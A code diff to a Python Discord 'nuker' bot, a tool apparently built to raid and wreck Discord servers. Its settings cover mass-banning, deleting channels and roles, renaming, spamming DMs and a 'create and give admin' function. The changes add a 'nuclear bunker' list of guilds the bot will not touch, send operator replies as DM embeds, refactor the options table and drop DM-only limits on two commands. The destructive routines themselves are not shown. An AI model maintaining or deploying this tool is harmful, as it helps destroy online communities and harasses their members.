@@ -8,7 +8,7 @@ from discord.ext import commands
 from requests import get
 from datetime import datetime
 from os import listdir
-from time import time, sleep
+from time import sleep
 from typing import Optional
 from json import loads, dumps
 
@@ -38,7 +38,7 @@ if "settings.json" not in listdir():
     # Show connected servers on startup
     SHOWCONNECTEDSERVERS = True
 
-    towrite = dumps({"TOKEN": TOKEN, "USERID": USER_ID, "PREFIX": PREFIX, "STATUS": STATUS, "LOG": LOG, "LOGFILE": LOGFILE, "SHOWCONNECTEDSERVERS": SHOWCONNECTEDSERVERS, "ROLE_IDS": {}, "VOLUMESETTINGS": {}})
+    towrite = dumps({"TOKEN": TOKEN, "USERID": USER_ID, "PREFIX": PREFIX, "STATUS": STATUS, "LOG": LOG, "LOGFILE": LOGFILE, "SHOWCONNECTEDSERVERS": SHOWCONNECTEDSERVERS, "NUCLEARBUNKERS": [], "ROLE_IDS": {}, "VOLUMESETTINGS": {}})
 
     # Writes settings to file
     file = open("settings.json", "w+")
@@ -55,7 +55,7 @@ else:
     settings = loads(json_string)
 
     # If settings are missing, add them
-    defaultsettingsjson = {"TOKEN": "", "USERID": False, "PREFIX": "!", "STATUS": False, "LOG": True, "LOGFILE": "nuker_bot_log.txt", "SHOWCONNECTEDSERVERS": True, "ROLE_IDS": {}, "VOLUMESETTINGS": {}}
+    defaultsettingsjson = {"TOKEN": "", "USERID": False, "PREFIX": "!", "STATUS": False, "LOG": True, "LOGFILE": "nuker_bot_log.txt", "NUCLEARBUNKERS": [],"SHOWCONNECTEDSERVERS": True, "ROLE_IDS": {}, "VOLUMESETTINGS": {}}
     keysnotpresent = [i for i in defaultsettingsjson.keys() if i not in settings.keys()]
     if len(keysnotpresent) > 0:
         for key in keysnotpresent: settings[key] = defaultsettingsjson[key]
@@ -69,6 +69,7 @@ else:
     STATUS = settings["STATUS"]
     LOG = settings["LOG"]
     LOGFILE = settings["LOGFILE"]
+    NUCLEARBUNKERS = settings["NUCLEARBUNKERS"]
     SHOWCONNECTEDSERVERS = settings["SHOWCONNECTEDSERVERS"]
 
 # parse the STATUS var
@@ -146,20 +147,9 @@ def output_log(text):
             f.close()
 
 async def dm_user(user, message):
-    await user.send(message)
-
-# def config_options for volume command
-config_options = {
-    1: "ban",
-    2: "channels",
-    3: "roles",
-    4: "server",
-    5: "nuke_channel",
-    6: "dm",
-    7: "nick",
-    8: "maxchannels",
-    9: "nc_msg"
-}
+    embed=discord.Embed(description=message)
+    embed.set_author(name=user.name, icon_url=f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png")
+    await user.send(embed=embed)
 
 default_volume_settings = {
     "ban": True,
@@ -173,6 +163,11 @@ default_volume_settings = {
     "nc_msg": [False]
 }
 
+config_options = {}
+i = 1
+for key in default_volume_settings.keys():
+    config_options[i] = key
+    i += 1
 
 # nuking functions
 # create and give admin
@@ -364,6 +359,15 @@ Server Owner: {guild.owner}
 @bot.event
 async def on_message(msg):
     if msg.content.startswith(PREFIX):
+        if not isinstance(msg.channel, discord.channel.DMChannel):
+            if msg.guild.id in NUCLEARBUNKERS:
+                embed = discord.Embed(
+                    title="Error!",
+                    description="This guild appears to be a nuclear bunker!",
+                    colour=0xff0000
+                )
+                await msg.channel.send(content=None, embed=embed)
+                return
         cmds = []
         for command in bot.commands:
             cmds.append(str(command))
@@ -536,16 +540,14 @@ Server Owner: {ctx.guild.owner}
 
 
 @bot.command(name="resetvolume")
-@commands.dm_only()
 async def resetvolume(ctx):
     volume_settings=getVolumeSettings()
     volume_settings[f"{ctx.message.author.id}"] = default_volume_settings
     writeVolumeSettings(volume_settings)
-    await ctx.send("Reset volume settings.")
+    await dm_user(ctx.message.author, "Reset volume settings.")
 
 
 @bot.command(name="showvolume")
-@commands.dm_only()
 async def showvolume(ctx):
     volume_settings = getVolumeSettings()
     if f"{ctx.message.author.id}" not in volume_settings.keys():  # write default settings if entry doesn't exist
